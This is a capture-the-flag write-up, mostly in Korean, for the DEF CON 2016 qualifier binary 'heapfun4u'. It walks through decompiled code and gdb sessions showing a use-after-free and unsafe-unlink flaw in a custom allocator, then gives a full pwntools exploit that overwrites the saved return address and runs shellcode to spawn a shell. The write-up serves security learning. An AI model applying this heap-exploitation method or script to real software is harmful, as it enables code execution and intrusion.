---
title: "Baby's First) heapfun4u"
sidebar_position: 1
---
## **Information**

### **Description**
```
Guess what, it is a heap bug.

[file](http://download.quals.shallweplayaga.me/873c6d81dd688c9057d5b229cf80579e/heapfun4u)

heapfun4u\_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me:3957
```
### **File**

* [heapfun4u](/attachments/1147021/1147020.bin)

### **Source Code**

* <https://github.com/legitbs/quals-2016/tree/master/heapfun4u>

## **Writeup**

### File information

```
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$ file heapfun4u
heapfun4u: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b019e6cbed93d55ebef500e8c4dec79ce592fa42, stripped
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$ checksec --file heapfun4u
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY Fortified Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No  0       3   heapfun4u
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$
```

* 해당 프로그램을 실행하면 다음이 출력됩니다.

```
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$ ./heapfun4u 
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
|
```

### **Binary analysis**

#### **Main**

* 해당 함수는 다으뫄 같은 기능을 합니다.
  + memset()함수를 이용해 gArray 영역을 '0'으로 초기화합니다.
  + 사용자 입력 값이 'A'인 경우:  
    - 먼저 gCount의 값이 100인지 합니다.
      * 해당 값이 100이면 프로그램이 종료됩니다.
      * 해당 변수는 buffer 공간을 생성한 갯수를 저장합니다.
    - read()함수를 이용하여 사용자로 부터 생성할 buffer의 크기를 입력받습니다.
      * 해당 값은 AllocateBuffer() 함수의 인자 값으로 전달됩니다.
      * AllocateBuffer() 함수는 전달받은 값만큼 heap 영역을 생성한 후 주소를 리턴합니다.
      * 할당된 Heap 영역은 gArray[count]에 저장됩니다.
      * 할당된 Heap 영역의 size는 gArraySize[count]에 저장됩니다.
  + 사용자 입력 값이 'F'인 경우:  
    - PrintArray()함수를 호출합니다.
      * 해당 함수는 gArray, gArraySize에 저장된 값을 모두 출력합니다.
    - 그리고 read()함수를 이용하여 해제 할 buffer의 번호를 입력 받습니다.
      * 입력받은 값은 FreeBuffer()함수에 다음과 같은 형태로 전달됩니다.
      * Ex) FreeBuffer(gArray[입력받은 번호])
      * 즉, gArray[]에 저장된 Heap 주소를 전달하는 것입니다.
  + 사용자 입력 값이 'N'인 경우:
    - NiceGuy() 함수를 호출합니다.
  + 사용자 입력 값이 'W'인 경우:  
    - WriteBuffer() 함수를 호출합니다.

```c title="__main__"
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v3; // rsi@1
  int count; // ebx@9
  __int64 result; // rax@22
  char buf; // [rsp+0h] [rbp-120h]@2
  int size; // [rsp+10Ch] [rbp-14h]@1

  memset(gArray, 0, 800uLL);
  gCount = 0;
  size = 0;
  setvbuf(stdin, 0LL, 2, 0LL);
  v3 = 0LL;
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( 1 )
  {
    puts("[A]llocate Buffer");
    puts("[F]ree Buffer");
    puts("[W]rite Buffer");
    puts("[N]ice guy");
    puts("[E]xit");
    printf("| ", v3);
    v3 = &buf;
    if ( read(0, &buf, 0xFFuLL) <= 0 )
      break;
    switch ( buf )
    {
      case 'A':
        if ( gCount == 100 )
          exit(0);
        printf("Size: ", &buf);
        v3 = &buf;
        if ( read(0, &buf, 0xFFuLL) <= 0 )
          exit(0);
        size = atoi(&buf);
        count = gCount;
        gArray[count] = (void *)AllocateBuffer(size);
        gArraySize[gCount] = size;
        if ( !gArray[gCount] )
          exit(0);
        ++gCount;
        break;
      case 'E':
        puts("Leave");
        return 0LL;
      case 'F':
        PrintArray();
        printf("Index: ", &buf);
        v3 = &buf;
        if ( read(0, &buf, 0x100uLL) <= 0 )
          exit(0);
        size = atoi(&buf) - 1;
        if ( size < 0 || size > 99 )
          exit(0);
        if ( !gArray[size] )
          exit(0);
        FreeBuffer((__int64)gArray[size]);
        break;
      case 'N':
        NiceGuy();
        break;
      case 'W':
        WriteBuffer();
        break;
      default:
        exit(0);
        return result;
    }
  }
  exit(0);
  return result;
}
```

#### **PrintArray**

* 해당 함수는 다음과 같은 기능을 합니다.
  + gArray[],gArraySize[]에 저장된 정보를 출력합니다.

```c title="PrintArray"
int PrintArray()
{
  void *addresss; // rax@2
  signed int i; // [rsp+Ch] [rbp-4h]@1

  for ( i = 0; i <= 99; ++i )
  {
    addresss = gArray[i];
    if ( addresss )
      LODWORD(addresss) = printf("%d) %p -- %d\n", (unsigned int)(i + 1), gArray[i], (unsigned int)gArraySize[i]);
  }
  return (signed int)addresss;
}
```

#### **NiceGuy**

* 해당 함수는 다음과 같은 기능을 합니다.
  + char 형 변수를 선언 후 해당 변수가 사용하는 주소를 출력합니다.(Leak of stack addresss)

```c title="NiceGuy"
int NiceGuy()
{
  char v1; // [rsp+Ch] [rbp-4h]@1
  return printf("Here you go: %p\n", &v1);
}
```

#### **WriteBuffer**

* 해당 함수는 다음과 같은 기능을 합니다.
  + PrintArray() 함수를 이용해 생성된 Buffer 정보를 출력합니다.
  + read()함수를 이용해 유저로 부터 입력받은 값을 저장할 Buffer 장소의 번호를 입력받습니다.
  + read()함수를 이용해 유저가 원하는 Buffer 공간에 값을 입력받아 저장합니다.

```c title="WriteBuffer"
ssize_t WriteBuffer()
{
  ssize_t result; // rax@8
  char buf; // [rsp+0h] [rbp-20h]@1
  int location; // [rsp+1Ch] [rbp-4h]@1

  location = 0;
  PrintArray();
  printf("Write where: ");
  if ( read(0, &buf, 15uLL) <= 0 )
    exit(0);
  location = atoi(&buf) - 1;
  if ( location < 0 || location > 99 )
    exit(0);
  if ( !gArray[location] )
    exit(0);
  printf("Write what: ", &buf);
  result = read(0, gArray[location], gArraySize[location]);
  if ( result <= 0 )
    exit(0);
  return result;
}
```

### Debuging

#### **AllocateBuffer / FreeBuffer**

* 다음과 같이 Break point를 설정합니다.

```c title="Breakpoint"
gdb-peda$ b *0x0400A6E
Breakpoint 1 at 0x400a6e
gdb-peda$ b *0x0400B4E
Breakpoint 2 at 0x400b4e
gdb-peda$
```

* 다음과 같이 AllocateBuffer 기능을 사용해 공간을 할당받습니다.
  + 할당받은 memory 영역을 살펴보면 Heap과 같은 형태입니다.

```c title="gdb-peda"
gdb-peda$ r
Starting program: /home/lazenca0x0/Documents/CTF/DEFCON2016/Baby's/heapfun4u/heapfun4u 
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer  
[N]ice guy
[E]xit
| A
Size: 16

Breakpoint 1, 0x0000000000400a6e in ?? ()
gdb-peda$ i r rax
rax            0x7ffff7ff5008	0x7ffff7ff5008
gdb-peda$ x/6gx 0x7ffff7ff5008 
0x7ffff7ff5008:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5018:	0x0000000000000fe0	0x0000000000000000
0x7ffff7ff5028:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/6gx 0x7ffff7ff5008 - 0x8 
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000fe0
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* 하지만 해당 프로세스의 memory map을 살펴보면 Heap, Stack 영역이 아닌 별도의 영역입니다.

```c title="info proc map"
gdb-peda$ info proc map
process 56985
Mapped addresss spaces:
          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/lazenca0x0/Documents/CTF/DEFCON2016/Baby's/heapfun4u/heapfun4u
            0x601000           0x602000     0x1000     0x1000 /home/lazenca0x0/Documents/CTF/DEFCON2016/Baby's/heapfun4u/heapfun4u
            0x602000           0x603000     0x1000     0x2000 /home/lazenca0x0/Documents/CTF/DEFCON2016/Baby's/heapfun4u/heapfun4u
      0x7ffff7a15000     0x7ffff7bcf000   0x1ba000        0x0 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7bcf000     0x7ffff7dcf000   0x200000   0x1ba000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x1ba000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x1be000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dd5000     0x7ffff7dda000     0x5000        0x0 
      0x7ffff7dda000     0x7ffff7dfd000    0x23000        0x0 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ffff7fdb000     0x7ffff7fde000     0x3000        0x0 
      0x7ffff7ff5000     0x7ffff7ff6000     0x1000        0x0 
      0x7ffff7ff6000     0x7ffff7ff8000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x22000 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x23000 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$
```

#### **Check for UAF(Use After Free)**

* 해당 함수에서 제공하는 기능을 이용해 UAF 취약성이 발생하는지 확인해보겠습니다.
* 다음과 같이 추가로 공간을 생성합니다.
  + Size: 64
  + Size: 16

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| A
Size: 64
Breakpoint 1, 0x0000000000400a6e in ?? ()
gdb-peda$ c
Continuing.

...
Size: 16

Breakpoint 1, 0x0000000000400a6e in ?? ()
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8 
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000043
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$
```

* 그리고 다음과 같이 할당된 공간을 해제 합니다.

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| F
1) 0x7ffff7ff5008 -- 16
2) 0x7ffff7ff5020 -- 64
3) 0x7ffff7ff5068 -- 16
Index: 2
Breakpoint 2, 0x0000000000400b4e in ?? ()
gdb-peda$ c
Continuing.

...
Index: 1

Breakpoint 2, 0x0000000000400b4e in ?? ()
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8 
0x7ffff7ff5000:	0x000000000000005b	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$
```

* 다음과 같이 크기가 64인 공간을 할당합니다.
  + AllocateBuffer 기능을 이용해 생성된 공간의 주소가 0x7ffff7ff5008 입니다.
  + 해당 주소는 첫번째 생성한 공간과 같은 주소 입니다.

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| A
Size: 64

Breakpoint 1, 0x0000000000400a6e in ?? ()
gdb-peda$ i r rax
rax            0x7ffff7ff5008	0x7ffff7ff5008
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8 
0x7ffff7ff5000:	0x000000000000005b	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$
```

* 그리고 해당 프로그램은 해제된 Buffer 공간을 List에서 제거 하지 않습니다.
  + 이로 인해 "FreeBuffer" 기능을 이용해 해제된 Buffer 공간을 계속 사용할 수 있습니다.
* 이러한 이유로 UAF 취약성이 발생할 수 있습니다.

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| W
1) 0x7ffff7ff5008 -- 16
2) 0x7ffff7ff5020 -- 64
3) 0x7ffff7ff5068 -- 16
4) 0x7ffff7ff5008 -- 64
Write where:
```

#### **Check for unsafe unlink**

* 우선 다음과 같은 크기의 Buffer를 생성합니다.
  + 16, 64, 16
* 다음은 해당 크기대로 할당된 Buffer 메모리 구조입니다.
  + 중요한 부분은 0x7ffff7ff5ff8에 저장된 값입니다.

```c title="gdb-peda"
gdb-peda$ b *0x0400B4E
Breakpoint 1 at 0x400b4e
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000043
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$ p/x 0x7ffff7ff5078 + 0x0000000000000f80
$18 = 0x7ffff7ff5ff8
gdb-peda$ x/gx 0x7ffff7ff5ff8
0x7ffff7ff5ff8:	0x0000000000000000
```

* 두번재 Buffer 공간을 해제하게 되면 0x7ffff7ff5ff8 영역에 2번째 buffer의 chunk size 값이 저장된 영역의 주소(0x00007ffff7ff5018)가 저장됩니다.

```c title="gdb-peda"
Breakpoint 1, 0x0000000000400b4e in ?? ()
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$ x/gx 0x7ffff7ff5ff8
0x7ffff7ff5ff8:	0x00007ffff7ff5018
gdb-peda$
```

* 이어서 첫번째 Buffer 공간을 해제하게 되면 0x7ffff7ff5ff8 영역에 1번째 buffer의 chunk size 값이 저장된 영역의 주소(0x00007ffff7ff5000)가 저장됩니다.

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| F
1) 0x7ffff7ff5008 -- 16
2) 0x7ffff7ff5020 -- 64
3) 0x7ffff7ff5068 -- 16
Index: 1
Breakpoint 1, 0x0000000000400b4e in ?? ()
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x000000000000005b	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$ x/gx 0x7ffff7ff5ff8
0x7ffff7ff5ff8:	0x00007ffff7ff5000
gdb-peda$
```

* chunk size 값이 저장된 영역의 주소를 저장할 위치 값은 다음과 같이 계산됩니다.
  + Forward Pointer의 주소 값(0x7ffff7ff5078) + Forward Pointer의 주소영역에 저장된 값(0x0f80) =  0x7ffff7ff5ff8
  + 즉, Forward Pointer의 주소영역에 저장된 값(0x0f80)에 의해 chunk size 값이 저장될 영역의 주소가 결정됩니다.
  + 이러한 취약성을 이용해 원하는 주소에 해제된 Buffer의 시작 주소를 저장할 수 있습니다.

#### **PoC(unsafe unlink)**

* 다음과 같은 방법으로 unsafe unlink를 검증할 수 있습니다.
  + Top chunk의 값을 0xf80에서 0xfa0으로 변경합니다.
  + 그리고 첫번째 Buffer 영역을 해제합니다.

```c title="gdb-peda"
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80

gdb-peda$ set {int}0x7ffff7ff5078 = 4000
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000fa0

gdb-peda$ p/x 0x7ffff7ff5078 + 0x0000000000000fa0
$27 = 0x7ffff7ff6018
gdb-peda$ x/gx 0x7ffff7ff6018
0x7ffff7ff6018:	0x00007ffff7df59c0
gdb-peda$ p/x 0x7ffff7ff5078 + 0x0000000000000f80
$26 = 0x7ffff7ff5ff8
gdb-peda$ x/gx 0x7ffff7ff5ff8
0x7ffff7ff5ff8:	0x00007ffff7ff5018
gdb-peda$
```

* Top chunk 값 변경으로 인해 해제된 Buffer 영역의 시작 주소 값이 0x7ffff7ff5ff8 이 아닌 0x7ffff7ff6018 영역에 저장되었습니다.

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| F
1) 0x7ffff7ff5008 -- 16
2) 0x7ffff7ff5020 -- 64
3) 0x7ffff7ff5068 -- 16
Index: 1
Breakpoint 1, 0x0000000000400b4e in ?? ()
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x000000000000005b	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000fa0
gdb-peda$ x/gx 0x7ffff7ff5ff8
0x7ffff7ff5ff8:	0x00007ffff7ff5018
gdb-peda$ x/gx 0x7ffff7ff6018
0x7ffff7ff6018:	0x00007ffff7ff5000
gdb-peda$
```

### Structure of Exploit code

:::note [Description]
1. Unsafe unlink 취약성이 발생할 수 있는 Memory 구조을 생성합니다.
   1. 첫번째 공간할당은 해당 프로그램에서 할당되는 최소 크기(16) 만큼 공간을 할당합니다.
   2. 두번째 공간할당은 Fake chunk를 저장하기 위한 공간을 할당(128) 합니다.
   3. 세번째 공간할당은 최소 크기(16)만큼 공간을 할당합니다.
2. UAF 취약성 생성합니다.
   1. 두번째 Buffer,첫번째 Buffer을 해제 합니다.
   2. Fake chunk를 저장 할 네번째 Buffer 공간(128)을 할당 합니다.
3. Unsafe unlink 취약성을 발생 시키기 위한 Fake chunk를 네번째 Buffer 공간에 저장합니다.  
   1. 다음과 같은 구조의 Fake chunk를 저장합니다.
   2. p64(rip offset) + p64(0) + p64(Fake buffer size) + p64(fill fake buffer) + p64(fake free chunk size) + p64(forward point) + p64(backward point)
4. Unsafe unlink 취약성 실행
   1. 두번째 Buffer를 해제
      1. Unsafe unlink 취약성에 의해 RIP 값이 저장되어 있는 위치에 "두번째 Buffer 공간의 chunk size"가 저장된 주소 값이 저장됩니다.
5. 4번째 Buffer에 shellcode를 저장합니다.
6. 해당 프로그램을 종료합니다.  
:::

* The following information is required for an attack:

:::note[Check point]
* RIP Offset
:::

### **Information for attack**

#### **RIP Offset**

* 다음과 같은 방법으로 RIP Offset을 얻을 수 있습니다.
  + "Nice guy" 기능을 호출해서 Base Addresss(0x7fffffffe19c)를 구합니다.
  + 해당 프로그램 종료시 ret명령어가 사용하는 RSP 레지스터의 주소는 0x7fffffffe2d8 입니다.
  + 0x7fffffffe2d8 - 0x7fffffffe19c = 0x13c

```c title="gdb-peda"
gdb-peda$ r
Starting program: /home/lazenca0x0/Documents/CTF/DEFCON2016/Baby's/heapfun4u/heapfun4u 
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| N
Here you go: 0x7fffffffe19c
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| E
Leave
Breakpoint 1, 0x0000000000400b96 in ?? ()
gdb-peda$ i r rsp
rsp            0x7fffffffe2d8	0x7fffffffe2d8
gdb-peda$ p/x 0x7fffffffe2d8 - 0x7fffffffe19c
$1 = 0x13c
```

## **Exploit Code**

```python title="exploit.py"
from pwn import *

p = process('./heapfun4u')

def niceguy():
    p.recv()
    p.sendline('N')
    p.recvuntil(": ")
    addr = p.recvuntil("\n")
    return int(addr, 16)

def allocate(size):
    p.recv()
    p.sendline('A')
    p.recv()
    p.sendline(size)

def free(num):
    p.recv()
    p.sendline('F')
    p.recv()
    p.sendline(num)

def write(num,data):
    p.recv()
    p.sendline('W')
    addr_list = p.recv()
    target_addr = 0
    for line in addr_list.split('\n'):
        if line[0] == num:
            target_addr = int(line.split()[1], 16)
    p.sendline(num)
    p.recv()
    p.sendline(data)
    return target_addr

def exit():
    p.recv()
    p.sendline('E')

base_addr = niceguy()
rip_addr = base_addr + 316

log.info('base_addr: {}'.format(hex(base_addr)))
log.info('rip_addr : {}'.format(hex(rip_addr)))

#UAF
allocate('16')
allocate('104')
allocate('16')
free('2')
free('1')

#Leak Addresss
allocate('128')
second_buffer_addr = write('4','A')

rip_offset = rip_addr - second_buffer_addr 
log.info('save_offset_addr : {}'.format(hex(second_buffer_addr)))
log.info('rip_offset : {}'.format(hex(rip_offset)))

rip_payload = p64(rip_offset)			# rip offset
rip_payload += p64(0)					#
rip_payload += p64(16 + 2 + 1)			# fake buffer size
rip_payload += 'AAAAAAAA' * 2			# fill fake buffer
rip_payload += p64(16 + 2)				# fake freed buffer size
rip_payload += p64(second_buffer_addr)	# forward pointer
rip_payload += p64(0)					# backward pointer
write('4',rip_payload)
free('2')

payload = 'AAAA' * 4
payload += asm(shellcraft.amd64.sh(),arch="amd64")
write('4',payload)
exit()

p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | The flag is: Oh noze you pwned my h33p. |

## **Related Site**

* <https://0xabe.io/ctf/exploit/2016/05/23/DEFCONCTF-heapfun4u.html>
* <https://gist.github.com/zachriggle/692342471645b1a25414561493a51357>
* <https://blahcat.github.io/2016/05/24/defcon-ctf-2016-heapfun4u/>